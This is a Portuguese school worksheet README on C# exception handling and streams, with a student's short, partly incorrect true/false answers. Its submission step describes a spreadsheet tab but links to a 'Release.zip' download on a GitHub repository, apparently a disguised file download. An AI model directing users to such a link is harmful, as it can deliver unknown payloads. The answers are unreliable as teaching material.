# Ficha de Programação e Sistemas de Informação - Módulo 11

Cria um repositório **privado** no GitHub com o nome **"PSI_Ficha_M11"** e com um ficheiro **README**.

Podes fazer clone do repositório para o teu computador (ou para o Replit) e preencher o README localmente (ou no Replit) com as respostas dos exercícios. Seguidamente, terás de fazer commit e push das atualizações.

Alternativamente, podes preencher o ficheiro README diretamente no GitHub. A partir da página principal do repositório, clica em "Edit File" (ícone representando um lápis). Com o README preenchido, carrega no botão "Commit Changes".

Para entregar a ficha, acede a [este link](https://github.com/salvadoreira15/PSI_23-24_Ficha_M11/releases/download/v1.0/Release.zip) (separador **Ficha Módulo 11**), e mete o **URL** do teu repositório ao lado do teu nome.
No teu repositório, acede a "Settings -> Collaborators" e adiciona o utilizador "Manuel Geraldes" para ter acesso.

## Exercício 1 - Para cada afirmação sobre tratamento de erros em C#, indica se é **Verdadeira** ou **Falsa**. Justifica a tua resposta. (6v)

1. Falso, métodos lançam exceções quando ocorrem erros que não sabem resolver
2. Falso, o bloco try é so usado para um codigo potencialmente perigoso colocado dentro de um bloco try.
3. Verdadeiro, o block catch tem sempre de vir depois do block try.
4. Falso, o bloco finally é sempre usado depois do bloco catch com ou sem exceção.
5. Verdadeiro, se nenhuma das exceções existentes for adequada para um problema podem-se criar exceções personalizadas.
6. Falso, serve para manter recurso aberto apenas enquanto está a ser usado.

## Exercício 2 - Para cada afirmação sobre manipulação de *streams* em C#, indica se é **Verdadeira** ou **Falsa**. Justifica a tua resposta. (4v)

1. Verdadeiro, porque so se pode fazer uma coisa de cada vez.
2. Verdadeiro TextReader e TextWriter: adaptadores para texto que leem/escrevem de/para streams/strings
3. falso
4. Verdadeira.

## Exercício 3 - Escreve o código necessário para criar um programa em C# de acordo com as seguintes instruções: (10v)

- O programa deve aceitar como único argumento da linha de comandos um nome de ficheiro de texto e imprimir os conteúdos desse ficheiro no ecrã.
- O programa deve tratar separadamente todas as exceções que podem ocorrer quando o ficheiro é aberto para leitura, apresentando uma mensagem de erro adequada em cada caso.
